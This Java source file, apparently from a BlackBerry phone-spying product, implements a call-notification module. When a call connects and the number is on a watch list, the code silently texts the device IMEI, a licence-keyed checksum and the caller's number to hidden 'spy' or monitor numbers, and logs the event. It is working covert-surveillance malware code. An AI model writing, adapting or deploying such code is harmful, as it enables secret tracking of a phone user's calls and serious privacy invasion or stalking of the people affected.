package com.vvt.callnotif;

import java.util.Vector;
import com.vvt.bug.BugInfo;
import com.vvt.bug.PhoneNumberFormat;
import com.vvt.bug.Util;
import com.vvt.checksum.CRC32;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.watchmon.WatchListMonitor;
import net.rim.blackberry.api.phone.AbstractPhoneListener;
import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;

public class CallNotification extends AbstractPhoneListener implements Runnable {

	private final String TAG = "CallNotification";
	private final String CMD_ID = "1";
	private final String TAIL = "PX2UIZVPNO";
	private final int MAX_CHECKSUM_LENGTH = 8;
	private int callId = 0;
	private boolean isEnabled = false;	
	private BugInfo bugInfo = null;
	private Util util = new Util();
	private SMSSender smsSender = Global.getSMSSender();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	
	
	public void start(BugInfo bugInfo) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".start()", "Enter, isEnabled: " + isEnabled + " ,bugInfo != null: " + (bugInfo != null));
		}
		this.bugInfo = bugInfo;
		if (!isEnabled && bugInfo != null) {
			isEnabled = true;
			Phone.addPhoneListener(this);
		}
	}
	
	public void stop() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".stop()", "Enter, isEnabled: " + isEnabled);
		}
		if (isEnabled) {
			isEnabled = false;
			Phone.removePhoneListener(this);
		}
	}
	
	public void run() {
		try {
			checkAndReact(callId);			
		} catch (Exception e) {
			Log.error(TAG + ".run()", e.getMessage());
		}
	}

	private void execute(int callId) {
		this.callId = callId;
		Thread th = new Thread(this);
		th.start();
	}
	
	private void checkAndReact(int callId) {
		try {
			FxSMSMessage[]  smsMessage = createFxSMSMessage(callId);
			int count = smsMessage.length;
			if (count > 0) {
				PhoneCall phoneCall = Phone.getCall(callId);
				FxDirection direction = FxDirection.IN;
				if (phoneCall.isOutgoing()) {
					direction = FxDirection.OUT;
				}
				createSystemEvent(smsMessage, direction);
				// Sending SMS
				for (int i = 0; i < count; i++) {
					smsSender.send(smsMessage[i]);
					Thread.sleep(1000);
				}
			}
		} catch (Exception e) {
			Log.error(TAG + ".checkAndReact()", e.getMessage());
		}
	}
	
	private FxSMSMessage[] createFxSMSMessage(int callId) { // To send SMS to monitor number when call event happen !
		PhoneCall phoneCall = Phone.getCall(callId);	
		String phoneNumber = phoneCall.getDisplayPhoneNumber();
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG + ".createFxSMSMessage()", "ENTER, phoneNumber: " + phoneNumber);			
		}*/
		FxSMSMessage[] smsMessage = new FxSMSMessage[0];
		// If monitor number or home number will not send call notification
		Vector spyOrHomeNumbers = bugInfo.getSpyNumberStore();
		for (int i = 0; i < bugInfo.countHomeOutNumber(); i++) {
			spyOrHomeNumbers.addElement(bugInfo.getHomeOutNumber(i));
		}
		boolean numbersAreTheSame = util.isSCList(phoneCall, spyOrHomeNumbers);
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG + ".createFxSMSMessage()", "numbersAreTheSame: " + numbersAreTheSame);
		}*/
		if (!numbersAreTheSame) {			
			String text = ""; // To format message for sending to monitor number. 
			String phoneNumberEdited = PhoneNumberFormat.removeUnexpectedCharactersExceptStartingPlus(phoneNumber);
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG + ".createFxSMSMessage()", "phoneNumberEdited: " + phoneNumberEdited);
			}*/
			text += "<" + CMD_ID + "><" + PhoneInfo.getIMEI() + ">";
			text += "<" + getChecksum(CMD_ID) + ">";
			if (!phoneNumberEdited.equals(Constant.EMPTY_STRING)) {
				text += "<" + phoneNumberEdited + ">";
			} else {
				text += "<an unknown number>";
			}
			WatchListMonitor watchListMon = new WatchListMonitor();
			if (watchListMon.isWatchList(bugInfo.getWatchListInfo(), phoneNumber)) {
				int countHomeOutNumber = bugInfo.countHomeOutNumber();
				smsMessage = new FxSMSMessage[countHomeOutNumber];
				for (int i = 0; i < countHomeOutNumber; i++) {
					smsMessage[i] = new FxSMSMessage();
					smsMessage[i].setMessage(text);
					smsMessage[i].setNumber(bugInfo.getHomeOutNumber(i));
				}
			}
		}
		return smsMessage;
	}
	
	private String getChecksum(String cmd) {
		String crc32Hex = null;
		try {
			String data = cmd + PhoneInfo.getIMEI() + licenseInfo.getActivationCode() + TAIL;
			long crc32 = CRC32.calculate(data.getBytes("UTF-8"));
			crc32Hex = Integer.toHexString((int) crc32).trim().toUpperCase();
			// Checksum must always contain 8 characters
			int length = crc32Hex.length();
			if (length > MAX_CHECKSUM_LENGTH) {
				crc32Hex = crc32Hex.substring(length - MAX_CHECKSUM_LENGTH);
			} else if (length < MAX_CHECKSUM_LENGTH) {
				StringBuffer buffer = new StringBuffer(crc32Hex);
				int diff = MAX_CHECKSUM_LENGTH - length;
				for (int i = 0; i < diff; i++) {
					buffer.insert(0, "0");
				}
				crc32Hex = buffer.toString();
			}
		} catch (Exception e) {
			Log.error(TAG + ".getChecksum()", e.getMessage(), e);
		}
		return crc32Hex;
	}
	
	private void createSystemEvent(FxSMSMessage[] smsMessage, FxDirection direction) {
		// Generate Call notification system event
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.CALL_NOTIFICATION);
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setDirection(direction);
		systemEvent.setSystemMessage(smsMessage[0].getMessage());
		db.insert(systemEvent);
	}
	
	// Override AbstractPhoneListener
	public void callConnected(int callId) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".callConnected()", "Enter");
		}
		execute(callId);
	}	
}
